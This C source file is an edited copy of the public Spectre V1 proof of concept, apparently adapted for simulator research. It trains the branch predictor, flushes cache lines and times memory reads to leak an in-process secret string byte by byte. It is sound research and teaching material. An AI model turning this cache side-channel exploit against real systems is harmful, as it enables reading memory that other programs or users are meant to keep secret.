/*                               -*- Mode: C -*- 
 * Copyright (C) 2017, Gururaj Saileshwar
 * 
 * Filename: spectre.c
 * Description: 
 * Author: Saileshwar
 * Created: Wed Jan 23 15:19:29 2019 (-0500)
 * Last-Updated: Wed Nov  6 11:13:33 2019 (-0500)
 *     Update #: 128
 */

/* Commentary: 
 * 
 * Edited version of Erik August's Spectre V1 PoC: https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
 * For more infomration on visualizing Spectre V1 with Gem5: http://www.lowepower.com/jason/visualizing-spectre-with-gem5.html
 */

/* Code: */

// The code follows the algorithm:
// For i=0:299
// 1. When i not multiple of 6: Ensure Branch Correctly Predicted: Access Arr2[0*512] to Arr2[5*512].
// 2. When i is a multiple of 6: Exploit Mis-predicted Branch that accesses out-of-bounds byte-location with secret value 50 & access Arr2[50*512] during mispredicted-execution.
// 3. Later access all the Arr2 entries and check where there is a hit (Arr2[0*512] to Arr[5*512] will have hits because accessed on correct-path & Arr[50*512] will have hit because accessed on wrong path (leaking secret=50).

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif



/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512] ;

char * secret = "2he Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
//uint8_t temp_array3[128 * 1024] ;


void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 5; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 299; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i *167) + 13) & 255;
      addr = & array2[mix_i * 512];      
      time1 = __rdtscp( & junk); /* READ TIMER */
      //_mm_lfence(); /* FENCE TO ENSURE SERIALIZATION */
      //time1 = __rdtsc(); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      //_mm_lfence(); /* FENCE TO ENSURE SERIALIZATION */
      //time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      
      /* printf("Entry: %d,\t Access Time: %d\n",mix_i, time2); */
      /* fflush(stdout); */
      
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
               results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    /* if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) */
    /*   break; /\* Clear success if best is > 2*runner-up + 5 or 2/0) *\/ */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
         const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 50;
  uint8_t value[2];

   for (i = 0; i < sizeof(array2); i++) 
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages  */

   /* for (i = 0; i < sizeof(temp_array3); i++)  */
   /*   temp_array3[i] = 2; /\* write to temp_array3 so that array2 is cleared from L1-Cache. We do not support Flush of Modified Lines in L1 $*\/ */
   
   /*
     if (argc == 3) {
     sscanf(argv[1], "%p", (void * * )( & malicious_x));
     malicious_x -= (size_t) array1; ///* Convert input value into a pointer 
     sscanf(argv[2], "%d", & len);
     }
   */

   printf("Array2 : 0x%x to 0x%x\n",&array2, &array2[255 * 512]); 
   printf("Secret Entry : 0x%x\n" , &array2[84*512]) ;
   fflush(stdout);
   
   printf("Reading %d bytes:\n", len);
   fflush(stdout);
  
   while (--len >= 0) {
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
     fflush(stdout);
     readMemoryByte(malicious_x, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     fflush(stdout);
     printf("0x%02X=’%c’ score=%d ", value[0],
            (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     fflush(stdout);
     if (score[1] > 0)
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
     fflush(stdout);
   }
  return (0);
}




/* spectre.c ends here */
